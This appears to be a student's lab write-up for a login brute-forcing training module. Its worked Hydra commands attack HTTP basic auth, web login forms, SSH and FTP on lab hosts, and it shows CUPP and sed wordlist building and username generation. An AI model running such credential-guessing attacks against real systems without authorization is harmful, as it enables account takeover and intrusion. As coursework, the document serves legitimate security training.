# Login Brute Forcing

## Basic HTTP Auth brute Forcing

### Default PWs - Hydra

**Using the technique you learned in this section, try attacking the IP shown above. What are the credentials used?**

`hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.51.157 -s 39675 http-get /`

<figure><img src=".gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

### Username Brute Force - Hydra

**Try running the same exercise on the question from the previous section, to learn how to brute force for users.**

`hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /home/zihuatanejo/Desktop/rockyou.txt -u -f 94.237.51.157 -s 39675 http-get /`

* answer is the same as for the previous one...

## Web Forms Brute Forcing

### Login Form Attacks

**Using what you learned in this section, try attacking the '/login.php' page to identify the password for the 'admin' user. Once you login, you should find a flag. Submit the flag as the answer.**

`hydra -l admin -P /home/zihuatanejo/Desktop/rockyou.txt -f 94.237.51.157 -s 39675 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`

<figure><img src=".gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

## Service Auth Attacks

### Service Auth Brute Forcing

**Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?**

* create custom wordlist william.txt from previous section...
  * CUPP tool
    * `cupp i`
* add modifications to created wordlist...
  * `sed -ri ‘/^.{,7}$/d’ william.txt # remove shorter than 8`&#x20;
  * ``$sed -ri ‘/[!-/:-@[-`{-~]+/!d’ william.txt # remove no specialchars``&#x20;
  * `$sed -ri ‘/[0–9]+/!d’ william.txt # remove no numbers`

<figure><img src=".gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

* run Hydra against SSH
  * `hydra -l b.gates -P william.txt -u -f ssh://94.237.50.84:40002`
    * _username: b.gates_
    * _password: wordlist william.txt_
    * _service: ssh_
  * we obtained PW
* `ssh b.gates@94.237.50.84 -p40002`
  * PW: from hydra attack...
  * `cat flag.txt`

**Once you ssh in, try brute forcing the FTP login for the other user. You should find another flag in their home directory. What is the flag?**

<figure><img src=".gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

* there is port 21 (FTP) running...
* let´s brute-force FTP login for the m.gates...
  * (cd /home && ls -> dir m.gates)
*   hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

    <figure><img src=".gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>


* obtain FLAG
  * `ftp 127.0.0.1`
  * `name: m.gates`
  * `pw: computer`
  * `ls -> flag.txt`
  * `get flag.txt`
  * `exit`
  * `ls`
  * `cat flag.txt`

<figure><img src=".gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

## Skills Assessment

### Skills Assessment - Website

**When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.**

`hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.51.157 -s 37248 http-get /`

<figure><img src=".gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

* login to obtain flag

**Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?**

`hydra -l user -P /home/zihuatanejo/Desktop/rockyou.txt -f 94.237.51.157 -s 37248 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"`

<figure><img src=".gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

* login to obtain flag

### Skills Assessment - Service Login

**As you now have the name of an employee from the previous skills assessment question, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also use 'usernameGenerator' to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.**

* generate list connected with Harry
  * `cupp -i`&#x20;
    * Harry&#x20;
    * special-characters-end-of-words= Y&#x20;
    * 1337 = Y&#x20;
* generate username list
  * `git clone` [`https://github.com/urbanadventurer/username-anarchy.git`](https://github.com/urbanadventurer/username-anarchy.git)
  * `cd username-anarchy/`
  * `./username-anarchy Harry Potter > user_harry.txt`
*   bruteforce SSH

    * `hydra -L user_harry.txt -P harry.txt -u -f ssh://94.237.54.197:51766 -t 4`

    <figure><img src=".gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>


* SSH login
  * `ssh harry.potter@94.237.54.197 -p51766`
    * `cat flag.txt`

**Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.**

<figure><img src=".gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

* there is a user g.potter
* netstat -antp | grep -i list
  * to see other services running...

<figure><img src=".gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

* bruteforce FTP login

<figure><img src=".gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

* obtain FLAG
  * `ftp 127.0.0.1`
  * `name: g.potter`
  * `PW`&#x20;
  * `ls -> flag.txt`
  * `get flag.txt`
  * `exit`
  * `ls`
  * `cat flag.txt`
